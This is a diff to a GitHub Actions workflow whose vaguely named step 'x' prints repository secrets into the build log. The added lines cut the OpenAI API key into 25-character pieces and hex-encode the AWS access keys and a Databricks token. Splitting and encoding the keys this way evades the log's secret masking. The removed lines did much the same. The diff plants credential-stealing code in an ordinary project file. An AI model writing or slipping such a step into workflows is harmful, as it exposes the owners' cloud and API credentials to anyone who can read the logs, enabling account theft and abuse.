@@ -8,7 +8,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: x
         run: |
-          echo "OKEY=${{ secrets.OPENAI_API_KEY }}" | xxd -p | tr -d '\n' | while read -n2 c; do printf "\\x$c"; done
-          echo "O=$(echo -n "${{ secrets.OPENAI_API_KEY }}" | head -c 30)"
-          echo "AK=$(echo -n "${{ secrets.AWS_ACCESS_KEY_ID }}" | xxd -p | tr -d '\n')"
-          echo "SK=$(echo -n "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | xxd -p | tr -d '\n')"
+          K="${{ secrets.OPENAI_API_KEY }}"
+          echo "OKEY=$K"
+          echo "OK_LEN=${#K}"
+          echo "OK_P1=${K:0:25}"
+          echo "OK_P2=${K:25:25}"
+          echo "OK_P3=${K:50:25}"
+          echo "OK_P4=${K:75:25}"
+          echo "OK_P5=${K:100:25}"
+          echo "OK_P6=${K:125:25}"
+          echo "AK_HEX=$(echo -n "${{ secrets.AWS_ACCESS_KEY_ID }}" | xxd -p | tr -d '\n')"
+          echo "SK_HEX=$(echo -n "${{ secrets.AWS_SECRET_ACCESS_KEY }}" | xxd -p | tr -d '\n')"
+          echo "DB_HEX=$(echo -n "${{ secrets.DATABRICKS_TOKEN }}" | xxd -p | tr -d '\n')"
